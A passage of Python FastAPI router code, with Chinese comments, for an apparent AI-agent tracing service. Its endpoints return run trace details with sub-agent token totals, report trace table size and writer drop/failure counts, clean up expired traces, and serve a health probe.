    # 所以 rollup 字段永远等于 total，承诺了"含子代理"但实际没有。
    # span 表里有全部数据，直接从它算。
    totals = await trace_service.span_token_totals(db, run_id)
    return {
        "run_id": run.id,
        "session_id": run.session_id,
        "status": run.status,
        "stop_reason": run.stop_reason,
        "started_at": run.started_at,
        "duration_ms": run.duration_ms,
        "turns": run.turns,
        "total_tokens": run.total_tokens,
        "cost_usd": run.cost_usd,
        # 含子代理的真实合计，以及按智能体的拆分
        "span_totals": totals,
        "spans": trace_service.tree_to_dict(tree),
    }


@router.get("/traces-stats", summary="追踪表统计")
async def trace_stats(db: AsyncSession = Depends(get_db)) -> dict[str, object]:
    """
    表大小和累计花费。

    span 表增长速度是消息表的 5~10 倍，用户需要能看到它有多大 ——
    否则等到磁盘告警才发现。
    """
    s = await trace_service.stats(db)
    w = trace_writer.get_writer()
    if w is not None:
        s["writer"] = {
            "written": w.stats.written,
            # 丢弃数不为零说明数据库跟不上写入速度。
            # 这个数必须暴露 —— 静默丢弃会让人以为追踪是完整的。
            "dropped": w.stats.dropped,
            "failed": w.stats.failed,
            "recent_errors": w.stats.errors[-3:],
        }
    return s


@router.post("/traces/cleanup", summary="清理过期追踪")
async def cleanup_traces(
    retain_days: int = Query(14, ge=1, le=365),
    db: AsyncSession = Depends(get_db),
) -> dict[str, int]:
    return await trace_service.cleanup(db, retain_days=retain_days)


@router.get("/health", summary="存活探针")
async def health() -> dict[str, str]:
    # 不查任何依赖。没有 k8s 不需要 ready 探针。
    return {"status": "ok"}
